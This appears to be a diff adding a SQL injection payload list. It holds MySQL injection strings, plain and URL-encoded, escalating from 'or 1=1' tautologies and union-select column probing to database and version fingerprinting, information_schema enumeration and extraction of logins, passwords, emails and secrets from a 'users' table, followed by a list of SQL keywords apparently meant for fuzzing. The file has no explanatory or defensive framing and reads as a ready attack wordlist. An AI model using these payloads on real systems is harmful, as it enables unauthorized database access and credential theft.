@@ -1,0 +1,42 @@
+'
+'or 1=1#
+1'or 1=1#
+0'or 1=1#
+'union select all 1#
+'union select all 1,2#
+'union select all 1,2,3#
+'union select all 1,2,3,4#
+'union select all 1,2,3,4,5#
+'union select all 1,2,3,4,5,6#
+'union select all 1,2,3,4,5,6,7#
+%27union+select+all+1%23
+%27union+select+all+1%2C2%23
+%27union+select+all+1%2C2%2C3%23
+%27union+select+all+1%2C2%2C3%2C4%23
+%27union+select+all+1%2C2%2C3%2C4%2C5%23
+%27union+select+all+1%2C2%2C3%2C4%2C5%2C6%23
+%27union+select+all+1%2C2%2C3%2C4%2C5%2C6%2C7%23
+'union select all 1,database(),user(),system_user(),@@version,6,7#
+%27union+select+all+1%2Cdatabase%28%29%2Cuser%28%29%2Csystem_user%28%29%2C%40%40version%2C6%2C7%23
+0'union select all 1,table_name,3,4,5,6,7 from information_schema.tables #
+0%27union+select+all+1%2Ctable_name%2C3%2C4%2C5%2C6%2C7+from+information_schema.tables+%23
+0'union select all 1,column_name,3,4,5,6,7 from information_schema.columns where table_name = 'users'#
+0%27union+select+all+1%2Ccolumn_name%2C3%2C4%2C5%2C6%2C7+from+information_schema.columns+where+table_name+%3D+%27users%27%23
+0' union select all 1, concat(id,login),password,email,secret,6,7 from users #
+0%27+union+select+all+1%2C+concat%28id%2Clogin%29%2Cpassword%2Cemail%2Csecret%2C6%2C7+from+users+%23
+
+movie
+action
+procedure
+limit
+order by
+asc
+desc
+delete
+update
+distinct
+having
+truncate
+replace
+like
+handler
